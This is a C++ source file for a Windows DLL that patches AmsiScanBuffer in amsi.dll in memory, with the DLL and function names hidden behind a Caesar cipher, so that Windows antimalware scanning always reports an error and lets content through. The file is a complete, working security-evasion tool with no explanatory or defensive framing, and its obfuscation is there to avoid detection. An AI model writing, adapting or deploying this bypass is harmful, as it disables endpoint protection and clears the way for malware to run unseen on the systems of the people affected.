#include <iostream>
#include <string>
#include <windows.h>
#include <unistd.h>

using namespace std;

typedef int(_cdecl *DLLPROC) (int);

void CopyMemoryWinAPI(void* destination, const void* source, size_t size)
{
	CopyMemory(destination, source, size);
}

string decryptCaesarCipher(string encryptedText, int key) {
	string decryptedText = "";
	for (char c : encryptedText) {
		if (isalpha(c)) {
    	char base = (islower(c)) ? 'a' : 'A';
			decryptedText += static_cast<char>((c - base - key + 26) % 26 + base);
		} else {
			// Jeśli znak nie jest literą, zostaje bez zmiany
			decryptedText += c;
		}
	}
	return decryptedText;
}

extern "C" __declspec(dllexport) void amsi() {
	uint8_t patchBytes[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
	int patchBytes_len = sizeof(patchBytes);

	HINSTANCE hinstDLL;
	DLLPROC addr;
	DWORD oldProtect;

	string dll_name = decryptCaesarCipher("pbhx.saa", 15);
	const char* dll_name_cstr = dll_name.c_str();

	hinstDLL = LoadLibrary(dll_name_cstr);
	if (hinstDLL != NULL) {
		string function_name = decryptCaesarCipher("PbhxHrpcQjuutg", 15);
		const char* function_name_cstr = function_name.c_str();
		
		addr = (DLLPROC)GetProcAddress(hinstDLL, function_name_cstr);

		if (addr != NULL) {
			VirtualProtect((LPVOID)addr, patchBytes_len, 0x40, &oldProtect);
			memcpy((void*)addr, patchBytes, patchBytes_len);
		}
		else {
			cout << "Can't create function pointer" << endl;
			exit(1);
		}
	}
	else {
		cout << "Can't load dll library" << endl;
		exit(1);
	}
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		OutputDebugString("DLL_PROCESS_ATTACH");
		break;

	case DLL_THREAD_ATTACH:
		OutputDebugString("DLL_THREAD_ATTACH");
    break;

  case DLL_THREAD_DETACH:
  	OutputDebugString("DLL_THREAD_DETACH");
  	break;

  case DLL_PROCESS_DETACH:
  	OutputDebugString("DLL_PROCESS_DETACH");
  	break;
  }
	return TRUE;
}